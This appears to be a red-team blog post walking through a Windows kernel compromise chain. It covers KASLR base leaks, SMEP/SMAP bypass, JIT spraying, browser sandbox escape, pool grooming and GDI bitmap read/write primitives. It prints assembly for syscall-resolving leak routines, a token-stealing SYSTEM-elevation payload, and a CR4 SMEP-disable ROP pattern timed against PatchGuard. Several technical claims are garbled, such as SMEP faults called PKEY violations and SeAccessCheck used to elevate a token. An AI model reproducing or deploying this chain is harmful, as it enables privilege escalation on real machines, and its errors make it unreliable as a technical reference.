Massacre Upon Windows 'SMEP & SMAP' Memory KASLR Evasion

Tags: ASLR Bypass · Sandbox Evasion · Exploitation · Red Teaming

Blog released: 2026 Mon 16 Mar.

Overview

Just wanting to share and dumping specifically how KASLR gets defeated, what SMEP and SMAP actually enforce at the CPU register level, and the full chain from a browser sandbox into ring-0 access.

Assuming folks already understand ROP, CFG, and basic exploit primitives. What follows is the architecture of a full kernel compromise on modern Windows against hardware enforced mitigations, written the way it actually works operationally.

PS: SMEP and SMAP are CPU features. They live in CR4. So... cannot patch them out from userland.

KASLR Filters Randomized in Kernel

On Windows randomizes the load address of ntoskrnl.exe and all other kernel modules at every boot. The randomization is applied at boot time by the Windows boot loader before the kernel begins executing. On 64-bit Windows the kernel occupies the higher canonical address range, 0xFFFF800000000000 and above, and KASLR slides the image base within a specific entropy budget inside that range.

The entropy on modern Windows Server builds is maybe around 9 bits for the kernel image base, giving 512 possible positions spaced 2MB apart.

Yep, sounds weak compared to userland ASLR entropy, and it is. This made KASLR easier to brute-force than userland ASLR, and Microsoft has been trying to close that gap incrementally.

What KASLR does not randomize (example) HAL.dll is loaded at a predictable offset relative to ntoskrnl. The GDT, IDT, and TSS are at fixed virtual addresses. The KPCR at gs:[0] in kernel context is not randomized.

The PTE self-map base address, which is how the kernel accesses its own page table entries, follows a known layout formula on older configurations though Microsoft randomized this in Windows RS1 (1607) and later.

PS: So the AS is leak one kernel address, calculate ntoskrnl base, everything else is arithmetic from there.

Phase 1: Leaking ntoskrnl Base

Method A: NtQuerySystemInformation Legacy

NtQuerySystemInformation with SystemModuleInformation class directly returns the load address of every kernel module to an unprivileged caller on older Windows builds. Microsoft added a SeDebugPrivilege check in Windows 8.1 to restrict this, but the restriction is inconsistently applied and several documented information class values still leak kernel pointers to low-integrity callers on specific configurations.

; NASM x64: direct syscall NtQuerySystemInformation with dynamic syscall resolution
; SystemModuleInformation = 0x0B

default rel

section .data
    buf_size        dq 0x20000
    buf_ptr         dq 0
    ret_len         dq 0
    nt_base         dq 0
    nt_size         dq 0

section .text
global leak_ntoskrnl_nqsi

resolve_ntdll:
    xor     rax, rax
    mov     rax, gs:[0x60]
    mov     rax, [rax+0x18]
    mov     rax, [rax+0x20]
    mov     rax, [rax]
    mov     rax, [rax]
    mov     rax, [rax+0x20]
    ret

resolve_syscall:
    push    rbx
    push    rsi
    push    rdi

    mov     rbx, rdi
    mov     eax, [rbx+0x3C]
    add     rax, rbx
    mov     eax, [rax+0x88]
    add     rax, rbx

    mov     ecx, [rax+0x18]
    mov     r8d, [rax+0x20]
    add     r8, rbx
    mov     r9d, [rax+0x24]
    add     r9, rbx
    mov     r10d, [rax+0x1C]
    add     r10, rbx

.next_name:
    dec     ecx
    js      .fail
    mov     esi, [r9+rcx*4]
    add     rsi, rbx
    mov     edi, 0x9B0D4E73
    xor     eax, eax

.hash_loop:
    lodsb
    test    al, al
    jz      .cmp_hash
    ror     edi, 13
    add     edi, eax
    jmp     .hash_loop

.cmp_hash:
    cmp     edi, edx
    jne     .next_name

    mov     eax, [r8+rcx*4]
    add     rax, rbx
    movzx   ecx, word [r10+rcx*2]
    add     rax, rcx
    mov     eax, [rax+4]
    jmp     .done

.fail:
    xor     eax, eax

.done:
    pop     rdi
    pop     rsi
    pop     rbx
    ret

leak_ntoskrnl_nqsi:
    sub     rsp, 0x40

    call    resolve_ntdll
    mov     rdi, rax

    mov     edx, 0x4C6F6F7B
    call    resolve_syscall
    mov     r11d, eax

    mov     rax, 0x20000
    sub     rsp, rax
    mov     [buf_ptr], rsp

    mov     ecx, 0x0B
    mov     rdx, [buf_ptr]
    mov     r8,  [buf_size]
    lea     r9,  [ret_len]

    mov     eax, r11d
    mov     r10, rcx
    syscall

    mov     rbx, [buf_ptr]
    mov     rax, [rbx+0x10]
    mov     [nt_base], rax
    mov     rax, [rbx+0x18]
    mov     [nt_size], rax

    mov     rax, [buf_size]
    add     rsp, rax

    add     rsp, 0x40
    ret

The RTL_PROCESS_MODULES structure returned starts with the count of modules. The first module entry is always ntoskrnl.exe. Its ImageBase field at offset +0x10 into the entry is the kernel base you need.

Method B: 'GDT & IDT' Pointer Leak via 'SGDT & SIDT'

The SGDT and SIDT instructions can be executed from ring-3 on x86/x64. They write the GDT and IDT base addresses respectively into a caller-supplied memory location. On Windows these structures reside inside the KPCR, and the KPCR is allocated in kernel virtual memory at a deterministic offset relative to ntoskrnl's data section on some configurations.

section .text
global leak_idt_base

leak_idt_base:
    sub  rsp, 0x10
    sidt [rsp]              ; write IDT limit (2 bytes) + base (8 bytes) to [rsp]
    mov  rax, [rsp+2]
    add  rsp, 0x10
    ret

PS: This technique is as old as the exploit scene itself. Shatter attacks circa 2003 used SIDT for kernel address leaks. Microsoft has partially mitigated this via KPTI on Spectre-mitigated builds, which remaps the kernel address space so that the IDT visible from userland is a shadow entry that does not directly reveal usable kernel pointers.

On builds without KPTI the leak is trivial.

Method C: Side-Channel Cache Timing VS KASLR

Try out some Precise side-channel approach against KASLR on modern Windows uses RDTSC or RDTSCP to measure memory access latency at candidate kernel addresses. Because KPTI ensures that kernel pages are not mapped in the userland page table during ring-3 execution on mitigated builds, a direct read will fault. But the cache state of those pages is still observable.

The attack works by systematically probing all 512 possible KASLR positions for ntoskrnl using Flush+Reload or Prime+Probe cache side-channel.

When the kernel executes any code (including normal interrupt handling during probe iterations), it try to export kernel pages into the shared L3 cache. A userland attacker measuring access latency to the candidate address will see a cache hit on the correct base address.

section .text
global rdtsc_probe_kaslr

; rdi = candidate kernel address to probe
; rax = cycle delta

rdtsc_probe_kaslr:
    push    rbx
    push    r12

    mfence
    lfence
    rdtsc
    shl     rdx, 32
    or      rax, rdx
    mov     r12, rax

    mov     rbx, rdi
    prefetcht0 [rbx]
    lfence
    mov     rax, [rbx]

    mfence
    lfence
    rdtscp
    shl     rdx, 32
    or      rax, rdx
    sub     rax, r12

    pop     r12
    pop     rbx
    ret

On a Spectre-mitigated Windows build with KPTI, speculative access is suppressed by the microcode-level IBPB and STIBP barriers inserted at kernel-to-userland transition. Variants of this attack that use TSX abort semantics as the exception suppressor survive some of these mitigations.

PS: TSX was disabled on many CPUs via microcode update after MDS. It's a moving target!!

'SMEP and SMAP' CPU-Level

SMEP is bit 20 of CR4. SMAP is bit 21 of CR4. A hardware feature flags written by the OS kernel at boot. Userland code cannot write to CR4. Attempting MOV CR4, rax from ring-3 generates a #GP general protection fault immediately.

section .text
global enable_smep_smap

; rax = temporary register
; sets CR4.SMEP (bit 20) and CR4.SMAP (bit 21)

enable_smep_smap:
    push    rbx

    mov     rax, cr4
    mov     rbx, 0x300000
    or      rax, rbx
    mov     cr4, rax

    pop     rbx
    ret

SMEP when set, any attempt by the CPU running in ring-0 to execute code at a virtual address marked as user-accessible (U/S bit set in the PTE) generates #PF with error code bit 4 (PKEY violation) set. This kills the classic ret2user technique stone dead. You cannot jump from kernel context into a shellcode buffer you allocated in userland.

SMAP, when set, any attempt by the CPU running in ring-0 to read or write data at a user-accessible address generates a #PF, unless the Alignment Check flag in RFLAGS is set. The kernel sets AC temporarily via STAC when it legitimately needs to copy data from userland (as in copy_from_user equivalents). This kills data-only kernel primitives that read from attacker-controlled userland buffers.

PS: SMAP is the nastier one for exploit developers. SMEP can sometimes be worked around with kernel ROP that stays entirely within kernel-mapped pages. SMAP means your kernel exploit cannot read argument data you prepared in userland.

The PTE Structure and the U/S Bit

Understanding why SMEP and SMAP work requires understanding page table entries at the bit level.

A 64-bit PTE on x86-64 looks like this:

; x86-64 PTE bit layout (8 bytes)
;
; Bit  0  : Present (P)
; Bit  1  : Read/Write (R/W)       0=read-only, 1=read-write
; Bit  2  : User/Supervisor (U/S)  0=supervisor-only, 1=user accessible
; Bit  3  : Write-Through (PWT)
; Bit  4  : Cache Disable (PCD)
; Bit  5  : Accessed (A)
; Bit  6  : Dirty (D)
; Bit  7  : Page Size (PS) / PAT
; Bit  8  : Global (G)
; Bits 9-11  : Available (OS use)
; Bits 12-51 : Physical Page Number (PPN) << 12 = physical address
; Bits 52-62 : Available / Protection Keys
; Bit 63  : Execute Disable (XD / NX)
;
; U/S bit = 0 means page is supervisor-only
; SMEP fires when ring-0 tries to EXECUTE a U/S=1 page
; SMAP fires when ring-0 tries to ACCESS a U/S=1 page
; unless RFLAGS.AC is set (STAC instruction)

The bypass strategy therefore is not to flip CR4, which requires ring-0 already.

The bypass strategy is to keep execution and data entirely within pages that have U/S=0, meaning kernel-mapped pages, by constructing ROP/JOP chains that live in ntoskrnl or other kernel modules, writing any payload into a kernel pool allocation before executing it, and never touching a userland address from kernel context without legitimately setting AC.

Phase 2: JIT Spraying to Defeat CFG and KASLR

JIT spraying is kernel primitive available from a browser context because it abuses the JIT compiler itself to generate attacker-controlled content inside executable, CFG-valid pages.

The key is JIT-compiled code is executable by design, and its location can sometimes be made predictable through heap feng-shui or inferred through a timing side-channel.

The Spray Primitive

In a JIT-enabled JavaScript engine like V8 or Chakra, constants embedded in JIT-compiled code appear verbatim in the generated machine code.

An Adversary who can control the constants in a hot function can embed arbitrary byte sequences into the JIT output. The technique works because the compiler must emit immediate operands for arithmetic operations, and those immediates are the shellcode bytes.

; JIT spray target: JS engine emits x64 for constant operations
; Attacker crafts JS like: var x = 0x909090CC | 0;
; JIT emits something like:
;   48 B8 CC 90 90 90 00 00 00 00   MOV RAX, 0x00000000909090CC
;
; If execution lands 1 byte into this instruction:
;   B8 CC 90 90 90 ...[SNIP]...   becomes a different decode stream
;
; Crafting a spray that aligns a useful gadget at every N bytes:
;
; spray_block:
;   48 B8 [8 bytes of payload]      ; each block = 10 bytes
;   48 B8 [8 bytes of payload]      ; repeat to fill pages
;   ...[SNIP]...
;
; execution landing at offset +2 in any block hits the payload bytes
; CFG-validity: the JIT page entry point IS CFG-registered
; so a call to the page start is CFG-valid
; then you slide to the embedded payload via NOP sled or alignment

On Windows with CFG, the JIT spray works because SetProcessValidCallTargets is called by the JIT engine to register the compiled code's entry point in the CFG bitmap. The entire JIT page becomes CFG-valid from that entry point's perspective under some bitmap granularity configurations.

Chakra historically registered at 16-byte granularity, meaning any address within 16 bytes of the registered entry point was CFG-valid. This was the exploit primitive behind several Pwn2Own browser chains.

Heap Feng-Shui for JIT Placement

Making the JIT spray useful requires controlling or predicting where the JIT allocates its pages. The JIT uses VirtualAlloc with MEM_COMMIT | MEM_RESERVE and PAGE_EXECUTE_READWRITE (later changed to RW then RX in hardened configurations). The allocation address is subject to ASLR, but:

  • Large spray volumes mean many allocations, and at some point the address space gets dense enough that guessing a region works statistically.
  • The allocator tends to use contiguous virtual address ranges. If you can observe the address of any JIT allocation via an info leak, you can predict neighboring allocations.
  • ACG (Arbitrary Code Guard) blocks PAGE_EXECUTE_READWRITE allocations entirely. On a browser with ACG enabled, the JIT must use a cross-process JIT model where the compiler runs in a separate process. This changes the attack surface significantly.
; Heap spray pattern to fill JIT-adjacent region
; Called repeatedly in JS to groom allocator state
;
; In practice: allocate ~200 ArrayBuffers of size 0x1000
; Then free alternating ones to create holes
; Then trigger JIT allocation to land in a known hole
;
; PowerShell simulation of the allocation pattern:
;
; $spray = @()
; for ($i = 0; $i -lt 0x200; $i++) {
;     $spray += [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x1000)
; }
; for ($i = 0; $i -lt 0x200; $i += 2) {
;     [System.Runtime.InteropServices.Marshal]::FreeHGlobal($spray[$i])
; }
;

Phase 3: Browser Sandbox Escape

The Modern Chromium-based browsers run the renderer in a sandboxed process with a restricted token, no network access, and a heavily filtered syscall table enforced via the Windows Job Object and handle table restrictions. Getting from renderer code execution to kernel privileges requires two distinct steps:

  • Escaping the renderer sandbox
  • Then escalating in the kernel

The Renderer Sandbox Boundary

The renderer communicates with the browser process via IPC (Mojo in Chromium). The attack surface for sandbox escape is the IPC interface itself. Every IPC message handler in the browser process that processes renderer-supplied data is a potential vulnerability. A type confusion or integer overflow in a Mojo interface handler gives write primitives in the higher-privileged browser process.

The browser process itself is not sandboxed (it's the trusted parent). So code execution in the browser process means access to the full Win32 API, file system, registry, and critically, the ability to call kernel APIs without the syscall filtering that the renderer's Job Object enforces.

; Conceptual: renderer-to-browser privilege in terms of
; syscall capability delta
;
; Renderer allowed syscalls (filtered subset):
;   NtReadFile, NtWriteFile, NtCreateFile (restricted paths)
;   NtAllocateVirtualMemory, NtFreeVirtualMemory
;   NtProtectVirtualMemory (no EXECUTE flags allowed with ACG)
;   NtQuerySystemInformation (limited classes only)
;
; Browser process (unrestricted):
;   Full syscall table
;   NtCreateProcess, NtCreateThread
;   NtDeviceIoControlFile
;   NtLoadDriver
;   NtSetSystemInformation

Exploiting a Kernel Driver from the Browser Process

When execution is in the browser process, the path to kernel ring-0 runs through a vulnerable kernel driver. The attack model here is the same as a local privilege escalation from any medium-integrity process: find a kernel driver that exposes an IOCTL interface, find a memory corruption bug in its IOCTL handler, exploit it to get kernel code execution or a controlled kernel write primitive.

PS: This is where SMEP, SMAP, and KASLR all converge. You have code execution in a medium-integrity userland process. You need ring-0. The kernel is KASLR-randomized, SMEP is on, and SMAP is on.

The exploit chain from here requires:

  • Leak ntoskrnl base to defeat KASLR, via one of the methods in Phase 1.
  • Find a kernel pool overflow or arbitrary write in the target driver's IOCTL handler.
  • Use the arbitrary write to overwrite a kernel callback or function pointer with a ROP chain address inside ntoskrnl, staying entirely in kernel-mapped memory to satisfy SMEP.
  • Trigger the overwritten pointer from userland via a benign IOCTL call.
  • The kernel ROP chain runs, staged in ntoskrnl pages, fully SMEP-compliant.
  • ROP chain calls nt!PsLookupProcessByProcessId then nt!SeAccessCheck to elevate the current process token to SYSTEM.

Phase 4: Kernel ROP Without Touching Userland (SMEP and SMAP Compliant)

Every gadget in the ROP chain must reside in a kernel-mapped page (U/S bit = 0 in the PTE). Any gadget that resolves to a userland address will fire SMEP and take a #PF. Any data pointer that reads from userland will fire SMAP. The entire exploit payload must live in kernel virtual address space.

Token Stealing via Kernel Pool ROP

The classic token stealing payload elevates the current process to SYSTEM by swapping the Token field in the current process's EPROCESS structure with the token from the SYSTEM process. All of this happens in kernel memory. No userland addresses involved. SMEP-clean, SMAP-clean.

section .text
global token_steal_rop_payload

token_steal_rop_payload:
    mov     rax, qword [gs:0x188]
    mov     rax, qword [rax + 0x220]
    mov     rcx, rax

find_system:
    mov     rax, qword [rax + 0x448]
    sub     rax, 0x448
    mov     rdx, qword [rax + 0x440]
    cmp     rdx, 4
    jne     find_system

    mov     rdx, qword [rax + 0x4B8]
    and     rdx, 0xFFFFFFFFFFFFFFF0
    mov     qword [rcx + 0x4B8], rdx

    ret

This payload runs entirely in kernel context, reads and writes kernel pool addresses only, and never references a userland address. SMEP does not fire because the gadgets are in ntoskrnl pages with U/S=0. SMAP does not fire because no userland data is accessed.

PS: The offsets 0x220, 0x440, 0x448, 0x4B8 are version-specific to a particular Windows build. For a production exploit chain these must be fingerprinted dynamically from the leaked kernel base or via NtQuerySystemInformation structure offsets before the payload runs.

Defeating SMEP via CR4 Flip (Requires Existing Kernel Primitive)

If a kernel arbitrary write primitive exists but the attacker wants to execute arbitrary shellcode rather than a gadget chain, one option is to flip CR4 bit 20 to disable SMEP. This requires a gadget in ntoskrnl that writes to CR4, and it must be triggered from kernel context. The pattern is:

; CR4 SMEP disable gadget - must be called from kernel context (ring-0 ROP)
; Gadget A: pop rax ; ret           (inside ntoskrnl)
; Gadget B: mov cr4, rax ; ret      (inside ntoskrnl, rare but exists)

; ROP chain on kernel stack:
;   [addr of Gadget A]
;   [CR4 value with bit 20 cleared: original_cr4 & ~0x100000]
;   [addr of Gadget B]
;   [now SMEP disabled, can execute userland pages from ring-0]
;   [addr of userland shellcode]

; This works ONLY if:
;   1. You already have kernel ROP running (exploit already triggered)
;   2. The gadget sequence exists in the loaded kernel modules
;   3. Windows Kernel Patch Protection (KPP / PatchGuard) hasn't fired yet
;
; PatchGuard periodically validates CR4 value
; so this SMEP disable is transient - must complete before PatchGuard tick

PS: PatchGuard runs on a randomized timer, approximately 5 to 10 minutes between checks. The CR4 flip approach gives a window of execution time before PatchGuard notices the modified CR4 and BSODs the machine.

An exploit completes its payload and restores CR4 before that timer fires. BYOVD that permanently patches PatchGuard is the more reliable production approach but that's a separate post.

Phase 5: Pixel Memory and Pool Grooming

Pool grooming is the kernel-level equivalent of heap feng-shui. Before triggering a kernel pool overflow, the attacker massages the kernel pool allocator state so that the target allocation lands adjacent to a controllable object whose fields, when overwritten by the overflow, give a useful primitive.

The Pool Layout Problem

The Windows kernel pool allocator (specifically the segment heap introduced in Windows 10 20H1 for the non-paged pool) uses a slab-like allocation model where objects of similar sizes are placed in the same pool chunk. Controlling what gets allocated adjacent to the vulnerable buffer is the entire game.

The classic controlled-allocation object for pool grooming on Windows has historically been the PIPE_ATTRIBUTE structure, the EVENT object, or for more recent chains, TypedObject chunks from the kernel object manager. These objects can be sprayed in large quantities from userland via documented APIs, they are known sizes, and they contain function pointers or size fields that, when overwritten, produce the next exploit primitive.

Pixel Buffer Pool Primitives

A more advanced pool primitive on Windows uses GDI objects, specifically bitmap pixel data, as the spray vehicle. This was the heart of many CTF and real-world kernel exploits from 2015 through 2020 before Microsoft removed direct access to SURFACE.pvScan0 from userland in Windows RS3 (Fall Creators Update 2017).

The bitmap primitive worked because GDI32.dll exposed GetBitmapBits and SetBitmapBits which read and wrote directly to the kernel-side pixel buffer. If an attacker could make the kernel pvScan0 pointer of one bitmap object point to the pixel buffer of another, they had an arbitrary read/write in kernel memory dressed as a legitimate GDI call. No syscall manipulation, no ROP, just bitmap operations.

; Bitmap pool primitive (pre-RS3, documented for historical/research context)
; Two bitmaps: Worker (read/write tool) and Manager (address holder)
;
; Setup:
;   CreateBitmap(0x60, 1, 1, 32, NULL) x2
;   -> both allocated in kernel session pool as SURFACE objects
;   -> adjacent if pool is groomed correctly
;
; After pool overflow overwrites Manager.pvScan0:
;   Manager.pvScan0 now points to address we want to read/write
;
; Read any kernel address:
;   SetBitmapBits(Manager, 8, &target_addr) ; set pvScan0 to target
;   GetBitmapBits(Worker, 8, &output)        ; read 8 bytes from target
;
; Write any kernel address:
;   SetBitmapBits(Manager, 8, &target_addr)
;   SetBitmapBits(Worker, 8, &new_value)
;
; Result: arbitrary kernel R/W from ring-3 without any syscall restriction
; SMEP irrelevant because no code execution, just data operations
; pvScan0 in kernel address space so SMAP irrelevant too

The modern replacement for this primitive on post-RS3 Windows uses NtGdiGetRealizationInfo, ExtTextOut with crafted glyph data, or the WNDCLASSEX cbWndExtra corruption technique. The underlying principle is identical: find a kernel object that the OS exposes a read/write channel to from userland, corrupt it to redirect that channel to arbitrary kernel memory, then use the channel as an R/W primitive.
